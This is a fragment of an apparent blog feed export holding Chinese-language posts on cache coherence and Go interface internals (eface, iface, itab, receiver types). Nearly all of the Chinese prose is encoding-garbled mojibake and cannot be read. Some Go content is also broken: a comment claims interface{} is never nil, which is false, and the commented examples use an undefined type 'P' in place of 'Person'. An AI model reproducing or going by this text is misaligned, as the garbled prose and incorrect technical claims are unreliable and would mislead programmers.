<li>å¯è§æ€§: æ•°æ®åŒæ­¥ç›¸å…³ï¼Œå‰é¢è®¨è®ºçš„ CPU Cache è®¾è®¡ä¸»è¦å…³æ³¨çš„å°±æ˜¯å¯è§æ€§ï¼Œå³åŒä¸€æ—¶åˆ»æ‰€æœ‰ CPU çœ‹åˆ°çš„æŸä¸ªåœ°å€ä¸Šçš„å€¼æ˜¯ä¸€è‡´çš„ã€‚<strong>ç¼“å­˜ä¸€è‡´æ€§ä¸»è¦è§£å†³çš„å°±æ˜¯æ•°æ®å¯è§æ€§çš„é—®é¢˜</strong></li>
<li>é¡ºåºæ€§: å†…å­˜å±éšœä¿è¯å±éšœå‰çš„æŸäº›æ“ä½œå¿…å®šé™äºå±éšœåçš„æ“ä½œå‘ç”Ÿä¸”å¯è§ã€‚ä½†å±éšœå‰æˆ–å±éšœåçš„æŒ‡ä»¤ï¼ŒCPU/ç¼–è¯‘å™¨ä»ç„¶å¯ä»¥åœ¨ä¸æ”¹å˜å•çº¿ç¨‹ç»“æœçš„æƒ…å†µä¸‹è¿›è¡Œå±€éƒ¨é‡æ’ã€‚æ¯ä¸ªç¡¬ä»¶å¹³å°æœ‰è‡ªå·±çš„åŸºç¡€é¡ºåºæ€§(å¼º/å¼±å†…å­˜æ¨¡å‹)</li>
</ul>
<p>å¯¹å¼€å‘è€…æ¥è¯´ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡å°è£…å¥½çš„ mutex å®Œæˆå¤§éƒ¨åˆ†çš„å¹¶å‘æ§åˆ¶ï¼Œè€Œæ— éœ€å…³æ³¨åº•å±‚ç”¨äº†å“ªäº›å†…å­˜å±éšœï¼Œå„å¹³å°çš„å†…å­˜ä¸€è‡´æ€§ç­‰ç»†èŠ‚ã€‚ä½†æ˜¯åœ¨ä½¿ç”¨æ¯” mutex æ›´åº•å±‚çš„åŒæ­¥æœºåˆ¶(å¦‚atomic, volatile, memory-barrierç­‰)æ—¶ï¼Œå°±è¦åŠ¡å¿…å°å¿ƒã€‚ä»åŸå­æ€§ï¼Œå¯è§æ€§ï¼Œé¡ºåºæ€§ç­‰æ–¹é¢ç¡®ä¿ä»£ç æ‰§è¡Œç»“æœå¦‚é¢„æœŸã€‚</p>
<h2 id="é˜…è¯»èµ„æ–™"><a href="#é˜…è¯»èµ„æ–™" class="headerlink" title="é˜…è¯»èµ„æ–™"></a>é˜…è¯»èµ„æ–™</h2><p><a href="https://www.zhihu.com/column/cpu-cache">é«˜é€Ÿç¼“å­˜ä¸ä¸€è‡´æ€§</a></p>
<p><a href="https://wudaijun.com/2019/04/cpu-cache-and-memory-model/">Cacheä¸€è‡´æ€§å’Œå†…å­˜æ¨¡å‹</a></p>
<p><a href="https://wudaijun.com/2018/09/distributed-consistency/">ä¸€è‡´æ€§æ‚è°ˆ</a></p>
<p><a href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AD%98%E4%B8%80%E8%87%B4%E6%80%A7%E6%A8%A1%E5%9E%8B">å†…å­˜ä¸€è‡´æ€§æ¨¡å‹</a></p>
<p><a href="https://monkeysayhi.github.io/2017/12/28/%E4%B8%80%E6%96%87%E8%A7%A3%E5%86%B3%E5%86%85%E5%AD%98%E5%B1%8F%E9%9A%9C/">ä¸€æ–‡è§£å†³å†…å­˜å±éšœ</a></p>
]]></content>
      <categories>
        <category>è®¡ç®—æœºç³»ç»Ÿ</category>
      </categories>
      <tags>
        <tag>å¹¶å‘ç¼–ç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title>Goè¯­è¨€åº•å±‚å¤§å†’é™©ä¹‹interface</title>
    <url>/2020/12/26/Go%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E5%A4%A7%E5%86%92%E9%99%A9%E4%B9%8Binterface/</url>
    <content><![CDATA[<p>å¾ˆå¤šç°ä»£è¯­è¨€éƒ½æœ‰â€œæ¥å£â€è¿™ä¸ªæ¦‚å¿µã€‚æ¥å£æ˜¯ä¸ºäº†è§£è€¦ï¼Œå³é€šè¿‡å¼•å…¥ä¸€ä¸ªçº¦å®šçš„ä¸­é—´å±‚è§£é™¤ä¸Šä¸‹å±‚ä¹‹é—´çš„é«˜åº¦ä¾èµ–å…³ç³»ã€‚è¿™ä¸œè¥¿å¬ç€ç„ä¹ï¼Œç”¨é¥­é¦†æ¥ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬ä½œä¸ºé¡¾å®¢é€šå¸¸å¹¶ä¸å…³å¿ƒèœæ˜¯æ€ä¹ˆåšçš„ï¼Œåªæ˜¯å’Œå¨å¸ˆæœ‰è¯¸å¦‚â€œéº»å©†è±†è…å¿…é¡»æ˜¯è¾£çš„â€ï¼Œâ€œå†°æ·‡æ·‹å¿…é¡»æ˜¯å†·çš„â€è¿™æ ·çš„çº¦å®šï¼Œå¨å¸ˆç”¨è‡ªå·±çš„æ–¹æ³•æŠŠè¿™ä¸ªçº¦å®šå®ç°å°±è¡Œäº†ã€‚ç¨‹åºè®¾è®¡ä¹Ÿæ˜¯å¦‚æ­¤ã€‚å‡½æ•° A å¯èƒ½éœ€è¦å›è°ƒå½¢å‚çš„æŸä¸ªæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯å¦‚ä½•å®ç°çš„å¹¶ä¸é‡è¦ï¼Œå…³é”®æ˜¯å®ƒå®ç°äº† A çš„çº¦å®šï¼Œè¿™ä¸ªçº¦å®šå°±æ˜¯æ‰€è°“çš„â€œæ¥å£â€ã€‚</p>
<p>åœ¨ java ä¸­ï¼Œç±»éœ€è¦åœ¨å®šä¹‰çš„æ—¶å€™æ˜¾ç¤ºå£°æ˜å®ç°äº†æŸæ¥å£ã€‚è€Œ Go ä¸ä¸€æ ·ï¼Œåªè¦ç»“æ„ä½“å®ç°äº†æŸä¸ªæ¥å£çš„å…¨éƒ¨æ–¹æ³•ï¼Œç¼–è¯‘å™¨å°±è®¤ä¸ºç»“æ„ä½“å®ç°äº†è¿™ä¸ªæ¥å£ã€‚è¿™æ ·çš„è®¾è®¡å¯èƒ½ä¼šè®©äººå› ä¸ºå®³æ€•åœ¨ä¸çŸ¥ä¸è§‰ä¸­å®ç°äº†æŸä¸ªæ¥å£æ„Ÿåˆ°ä¸å®‰ï¼Œè€Œä¸”ä¹Ÿä¸ä¾¿äºç¨‹åºå‘˜é˜…è¯»ï¼Œä½†æ˜¯ Go è¯­è¨€çš„è®¾è®¡è€…è®¤ä¸ºè¿™ç§æƒ…å†µå‡ ä¹ä¸ä¼šå‡ºç°ï¼Œè€Œä¸”ä»ç¼–è¯‘å™¨çš„è§’åº¦æ¥çœ‹æ˜¾ç¤ºå£°æ˜å®Œå…¨æ˜¯å¤šä½™çš„ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Tester <span class="keyword">interface</span> &#123;</span><br><span class="line">    test() <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> I <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// I å®ç°äº† Tester æ¥å£çš„å…¨éƒ¨æ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(i I)</span> <span class="title">test</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testing&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> t Tester = I(<span class="number">2</span>)</span><br><span class="line">    fmt.Println(t.test()) <span class="comment">// I å®ç°äº† Tester æ¥å£çš„ test() æ–¹æ³•ï¼Œmain ä½œä¸ºè°ƒç”¨æ–¹ä¸å…³å¿ƒ I æ˜¯å¦‚ä½•å®ç° test() çš„</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Go åªåœ¨ç¼–è¯‘æœŸå¯¹ç»“æ„ä½“æ˜¯å¦ç¬¦åˆæŸä¸ªæ¥å£è¿›è¡Œæ£€æŸ¥ã€‚å…·ä½“è€Œè¨€ï¼Œå°±åœ¨ä»¥ä¸‹ä¸‰ä¸ªæ—¶åˆ»ï¼š</p>
<ol>
<li>å˜é‡èµ‹å€¼</li>
<li>ä¼ é€’å‚æ•°</li>
<li>ä¼ é€’è¿”å›å€¼</li>
</ol>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Tester <span class="keyword">interface</span>&#123;</span><br><span class="line">    test() <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> I <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(i I)</span> <span class="title">test</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testing&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> t Tester = I(<span class="number">1</span>) <span class="comment">// å˜é‡èµ‹å€¼ï¼Œç¼–è¯‘å™¨è¿›è¡Œç±»å‹æ£€æŸ¥</span></span><br><span class="line">    echo(t) <span class="comment">// ä¼ é€’å‚æ•°ï¼Œç¼–è¯‘å™¨è¿›è¡Œç±»å‹æ£€æŸ¥</span></span><br><span class="line">    t = NewI(<span class="number">2</span>) <span class="comment">// ä¼ é€’è¿”å›å€¼ï¼Œç¼–è¯‘å™¨è¿›è¡Œç±»å‹æ£€æŸ¥</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewI</span><span class="params">(i <span class="keyword">int</span>)</span> <span class="title">I</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> I(i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">echo</span><span class="params">(t Tester)</span></span> &#123;</span><br><span class="line">    fmt.Println(t.test() + <span class="string">&quot;, pass&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨ Go è¯­è¨€ä¸­ï¼Œä»»æ„ç±»å‹çš„å¯¹è±¡éƒ½å¯ä»¥è½¬æ¢ä¸º <code>interface&#123;&#125;</code> ç±»å‹ï¼Œä¸€ä¸ªè¯¯åŒºæ˜¯å› æ­¤æŠŠ <code>interface&#123;&#125;</code> å½“ä½œ C è¯­è¨€çš„ç©ºæŒ‡é’ˆ <code>void*</code>ã€‚ä½†äº‹å®ä¸Š <code>interface&#123;&#125;</code> æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ç±»å‹ï¼Œä¸æŒ‡é’ˆæ˜¯å®Œå…¨ä¸åŒçš„ä¸¤ä¸ªæ¦‚å¿µï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> p *<span class="keyword">int</span></span><br><span class="line">    fmt.Println(p == <span class="literal">nil</span>)   <span class="comment">// trueï¼ŒæŒ‡é’ˆçš„é›¶å€¼ä¸º nil</span></span><br><span class="line">    fmt.Println(testNil(p)) <span class="comment">// false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">testNil</span><span class="params">(v <span class="keyword">interface</span>&#123;&#125;)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> v == <span class="literal">nil</span> <span class="comment">// æ€»æ˜¯ falseï¼Œå› ä¸º interface&#123;&#125; æ°¸è¿œä¸ä¸º nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h2><p>Go ç¼–è¯‘å™¨å°†æ¥å£æŒ‰ç…§æœ‰æ— æ–¹æ³•åˆ†ä¸ºä¸¤ç§ç»“æ„ä½“æ¥è¡¨ç¤ºï¼šæœ‰æ–¹æ³•çš„æ¥å£è¡¨ç¤ºä¸º <a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/runtime2.go#L203">runtime.iface</a>ï¼Œæ— æ–¹æ³•çš„ç©ºæ¥å£è¡¨ç¤ºä¸º <a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/runtime2.go#L208">runtime.eface</a>ã€‚è¿™äº›ç»“æ„ç”±ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æœŸç”Ÿæˆ</p>
<h3 id="æ— æ–¹æ³•æ¥å£åŠ-eface"><a href="#æ— æ–¹æ³•æ¥å£åŠ-eface" class="headerlink" title="æ— æ–¹æ³•æ¥å£åŠ eface"></a>æ— æ–¹æ³•æ¥å£åŠ eface</h3><p>å› ä¸ºç©ºæ¥å£æ¯”è¾ƒç®€å•ï¼Œæ‰€ä»¥ <a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/runtime2.go#L208">runtime.eface</a> çš„æˆå‘˜ä¹Ÿå°‘ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> eface <span class="keyword">struct</span> &#123; <span class="comment">// 16 å­—èŠ‚</span></span><br><span class="line">    _type *_type</span><br><span class="line">    data  unsafe.Pointer</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>_type</code> è¡¨ç¤ºåŸå¯¹è±¡çš„ç±»å‹å…ƒä¿¡æ¯</li>
<li><code>data</code> æ˜¯ä¸€ä¸ªæŒ‡å‘åŸå¯¹è±¡çš„æŒ‡é’ˆ</li>
</ul>
<p><a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/runtime2.go#L208">runtime.eface</a> æ˜¯å¯¹åŸå¯¹è±¡è¿›è¡Œä¸€å±‚ç®€å•çš„å°è£…ï¼Œé€šè¿‡ <a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/type.go#L31">runtime._type</a> ä¿ç•™äº†åŸå¯¹è±¡ç±»å‹çš„è¿è¡Œæ—¶å…ƒä¿¡æ¯ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> _type <span class="keyword">struct</span> &#123;</span><br><span class="line">    size       <span class="keyword">uintptr</span></span><br><span class="line">    ptrdata    <span class="keyword">uintptr</span></span><br><span class="line">    hash       <span class="keyword">uint32</span></span><br><span class="line">    tflag      tflag</span><br><span class="line">    align      <span class="keyword">uint8</span></span><br><span class="line">    fieldAlign <span class="keyword">uint8</span></span><br><span class="line">    kind       <span class="keyword">uint8</span></span><br><span class="line">    equal      <span class="function"><span class="keyword">func</span><span class="params">(unsafe.Pointer, unsafe.Pointer)</span> <span class="title">bool</span></span></span><br><span class="line">    gcdata     *<span class="keyword">byte</span></span><br><span class="line">    str        nameOff</span><br><span class="line">    ptrToThis  typeOff</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>size</code> è¡¨ç¤ºç±»å‹å¤§å°ï¼Œåˆ†é…å†…å­˜çš„æ—¶å€™è¦ç”¨åˆ°</li>
<li><code>hash</code> æ˜¯ç±»å‹çš„å“ˆå¸Œå€¼ï¼Œé€šå¸¸ç”¨äºå¿«é€Ÿç¡®å®šä¸¤ä¸ªç±»å‹æ˜¯å¦ç›¸åŒ</li>
<li><code>equal</code> ç”¨æ¥åˆ¤æ–­ä¸€ä¸ªç±»å‹çš„ä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ç›¸ç­‰</li>
<li><code>align</code> ç”¨æ¥ç¡®å®šè¿™ä¸ªç±»å‹çš„å­—èŠ‚å¯¹é½è¾¹ç•Œ</li>
</ul>
<p>æ€»è€Œè¨€ä¹‹ï¼Œ<a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/type.go#L31">runtime._type</a> åŒ…å«äº†ä¸â€œå¦‚ä½•æè¿°ä¸€ä¸ªç±»å‹â€æœ‰å…³çš„ä¿¡æ¯ã€‚</p>
<p>å¯¹ç©ºæ¥å£èµ‹å€¼åçš„æ•°æ®ç»“æ„è¡¨ç¤ºå¦‚ä¸‹ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Binary <span class="keyword">uint64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    b := Binary(<span class="number">200</span>)</span><br><span class="line">    any := (<span class="keyword">interface</span>&#123;&#125;)(b)</span><br><span class="line">    fmt.Println(any)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/12/26/WajYNX2scv8O4i6.png" alt="ç©ºæ¥å£"></p>
<h3 id="æœ‰æ–¹æ³•æ¥å£åŠ-iface"><a href="#æœ‰æ–¹æ³•æ¥å£åŠ-iface" class="headerlink" title="æœ‰æ–¹æ³•æ¥å£åŠ iface"></a>æœ‰æ–¹æ³•æ¥å£åŠ iface</h3><p><a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/runtime2.go#L203">runtime.iface</a> ä¸ä»…æœ‰æŒ‡å‘åŸæ•°æ®çš„ <code>data</code> å­—æ®µï¼Œè¿˜æœ‰ <a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/runtime2.go#L857">runtime.itab</a> ç±»å‹çš„ <code>tab</code> å­—æ®µï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> iface <span class="keyword">struct</span> &#123; <span class="comment">// 16 å­—èŠ‚</span></span><br><span class="line">    tab  *itab</span><br><span class="line">    data unsafe.Pointer</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/runtime2.go#L857">runtime.itab</a> æ˜¯ <a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/runtime2.go#L203">runtime.iface</a> çš„æ ¸å¿ƒå­—æ®µï¼Œæ˜¯å…·ä½“ç±»å‹å’Œæ¥å£ç±»å‹çš„ç»“åˆï¼Œå¯ä»¥çœ‹ä½œç»“æ„ä½“æŠŠæŸç§æ¥å£ç±»å‹å’ŒæŸç§å…·ä½“ç±»å‹è”ç³»åœ¨ä¸€èµ·:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> itab <span class="keyword">struct</span> &#123; <span class="comment">// 32 å­—èŠ‚</span></span><br><span class="line">    inter *interfacetype <span class="comment">// æ¥å£ç±»å‹ä¿¡æ¯</span></span><br><span class="line">    _type *_type         <span class="comment">// å…·ä½“ç±»å‹ä¿¡æ¯ </span></span><br><span class="line">    hash  <span class="keyword">uint32</span>         <span class="comment">// _type.hash çš„å‰¯æœ¬ï¼Œç”¨äºå¿«é€Ÿåˆ¤æ–­æ¥å£çš„å…·ä½“ç±»å‹</span></span><br><span class="line">    _     [<span class="number">4</span>]<span class="keyword">byte</span></span><br><span class="line">    fun   [<span class="number">1</span>]<span class="keyword">uintptr</span>    <span class="comment">// åº•å±‚æ•°ç»„ï¼Œå­˜å‚¨æ¥å£çš„æ–¹æ³•é›†çš„å…·ä½“å®ç°çš„åœ°å€ï¼Œå…¶åŒ…å«ä¸€ç»„å‡½æ•°æŒ‡é’ˆï¼Œå®ç°äº†æ¥å£æ–¹æ³•çš„åŠ¨æ€åˆ†æ´¾ï¼Œä¸”æ¯æ¬¡åœ¨æ¥å£å‘ç”Ÿå˜æ›´æ—¶éƒ½ä¼šæ›´æ–°</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/type.go#L366">runtime.interface</a> ç±»ä¼¼äº <a href="https://github.com/golang/go/blob/6c64b6db6802818dd9a4789cdd564f19b70b6b4c/src/runtime/type.go#L31">runtime._type</a>ï¼Œæ˜¯å¯¹æŸç§æ¥å£çš„æè¿°ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> nameOff <span class="keyword">int32</span></span><br><span class="line"><span class="keyword">type</span> typeOff <span class="keyword">int32</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> imethod <span class="keyword">struct</span> &#123;</span><br><span class="line"> name nameOff</span><br><span class="line"> ityp typeOff</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> interfacetype <span class="keyword">struct</span> &#123;</span><br><span class="line"> typ     _type      <span class="comment">// æ¥å£çš„å…·ä½“ç±»å‹ä¿¡æ¯</span></span><br><span class="line"> pkgpath name       <span class="comment">// æ¥å£çš„åŒ…ï¼ˆpackageï¼‰åä¿¡æ¯</span></span><br><span class="line"> mhdr    []imethod  <span class="comment">// æ¥å£æ‰€å®šä¹‰çš„å‡½æ•°åˆ—è¡¨</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯¹æœ‰æ–¹æ³•æ¥å£èµ‹å€¼åçš„æ•°æ®ç»“æ„è¡¨ç¤ºå¦‚ä¸‹ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;strconv&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Binary <span class="keyword">uint64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(i Binary)</span> <span class="title">String</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> strconv.FormatUint(i.Get(), <span class="number">10</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(i Binary)</span> <span class="title">Get</span><span class="params">()</span> <span class="title">uint64</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">uint64</span>(i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    b := Binary(<span class="number">200</span>)</span><br><span class="line">    s := fmt.Stringer(b) <span class="comment">// fmt.Stringer æ˜¯ä¸€ä¸ªä»…åŒ…å« String() string çš„æ¥å£</span></span><br><span class="line">    fmt.Println(s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/12/26/dwSRrUA2VOBu8XW.png" alt="æœ‰æ–¹æ³•æ¥å£"></p>
<h2 id="eface-å’Œ-iface-çš„åŒºåˆ«"><a href="#eface-å’Œ-iface-çš„åŒºåˆ«" class="headerlink" title="eface å’Œ iface çš„åŒºåˆ«"></a>eface å’Œ iface çš„åŒºåˆ«</h2><p><img src="https://i.loli.net/2021/01/21/6EYlosW1LPg7IXu.png" alt="efaceå’Œiface"></p>
<p>æ‰€æœ‰æ¥å£çš„æ•°æ®ç»“æ„éƒ½æœ‰ä¸€ä¸ªæŒ‡å‘å…·ä½“æ•°æ®çš„çš„æŒ‡é’ˆï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæ¥å£å˜é‡å¿…é¡»åˆå§‹åŒ–ã€‚ç„¶åæ ¹æ®è¿™ä¸ªæ¥å£æœ‰æ²¡æœ‰æ–¹æ³•å†³å®šæ˜¯å¦äº§ç”ŸæŠŠå…·ä½“ç±»å‹å’Œæ¥å£ç±»å‹ç»„åˆæˆä¸€ä¸ª itab</p>
<h2 id="ç±»å‹è½¬æ¢"><a href="#ç±»å‹è½¬æ¢" class="headerlink" title="ç±»å‹è½¬æ¢"></a>ç±»å‹è½¬æ¢</h2><p>Go æ–¹æ³•çš„æ¥æ”¶è€…å¯ä»¥æ˜¯æŒ‡é’ˆä¹Ÿå¯ä»¥æ˜¯ç»“æ„ä½“ï¼Œæ‰€ä»¥æ—¢å¯ä»¥æ˜¯æŒ‡é’ˆå®ç°äº†æŸæ¥å£ï¼Œä¹Ÿå¯ä»¥æ˜¯ç»“æ„ä½“å®ç°äº†æŸæ¥å£ï¼Œä½†æ˜¯åªèƒ½äºŒé€‰ä¸€ï¼Œå¦‚æœç»“æ„ä½“å’Œå…¶æŒ‡é’ˆå®ç°äº†åŒä¸€æ¥å£ï¼Œç¼–è¯‘å™¨ä¼šæŠ¥é”™â€œmethod redeclaredâ€ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Tester <span class="keyword">interface</span>&#123;</span><br><span class="line">    test()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">ç»“æ„ä½“åšæ¥æ”¶è€…çš„æ¥å£ï¼Œç”¨ç»“æ„ä½“æˆ–æŒ‡é’ˆåˆå§‹åŒ–éƒ½æ˜¯å¯ä»¥çš„</span></span><br><span class="line"><span class="comment">func (p Person) test() &#123;&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">func main() &#123;</span></span><br><span class="line"><span class="comment">    var t1 Tester = P&#123;&#125;</span></span><br><span class="line"><span class="comment">    var t2 Tester = &amp;P&#123;&#125;</span></span><br><span class="line"><span class="comment">    t1.test()</span></span><br><span class="line"><span class="comment">    t2.test()</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">æŒ‡é’ˆåšæ¥æ”¶è€…çš„æ¥å£ï¼Œåªèƒ½ç”¨æŒ‡é’ˆåˆå§‹åŒ–</span></span><br><span class="line"><span class="comment">func (p *Person) test() &#123;&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">func main() &#123;</span></span><br><span class="line"><span class="comment">    var t1 Tester = &amp;P&#123;&#125;</span></span><br><span class="line"><span class="comment">    t1.test()</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>ç»“æ„ä½“å®ç°æ¥å£ï¼Œä½¿ç”¨ç»“æ„ä½“å¯¹è±¡è¿›è¡Œæ¥å£å˜é‡åˆå§‹åŒ–ï¼›æŒ‡é’ˆå®ç°æ¥å£ï¼Œä½¿ç”¨æŒ‡é’ˆå¯¹è±¡è¿›è¡Œæ¥å£å˜é‡åˆå§‹åŒ–ï¼Œè¿™éƒ½æ˜¯é¡ºå…¶è‡ªç„¶çš„ã€‚åå¸¸çš„æ˜¯ç”¨ç»“æ„ä½“å®ç°æ¥å£å¯ä»¥ç”¨æŒ‡é’ˆå¯¹è±¡åˆå§‹åŒ–æ¥å£å˜é‡å’Œç”¨æŒ‡é’ˆå®ç°æ¥å£ä¸èƒ½ç”¨ç»“æ„ä½“å¯¹è±¡åˆå§‹åŒ–æ¥å£å˜é‡ã€‚</p>
<p>è¿™æ˜¯å› ä¸º Go ä¼ å‚æ—¶ç»Ÿä¸€ä½¿ç”¨â€œå€¼ä¼ é€’â€ã€‚æ‰€è°“â€œæ¥æ”¶è€…â€æœ¬è´¨ä¸Šä¹Ÿæ˜¯ä¸€ä¸ªå‚æ•°ï¼Œç¼–è¯‘å™¨ç¿»è¯‘æ—¶ä¼šå¤åˆ¶å‚æ•°åˆ°å¸§é¡¶ã€‚æ— è®ºä¸Šè¿°ä»£ç ä¸­åˆå§‹åŒ–å˜é‡ t1 çš„æ˜¯ P{} è¿˜æ˜¯ &amp;P{}ï¼Œä½¿ç”¨ t1.test() æ—¶éƒ½ä¼šå‘ç”Ÿå€¼æ‹·è´</p>
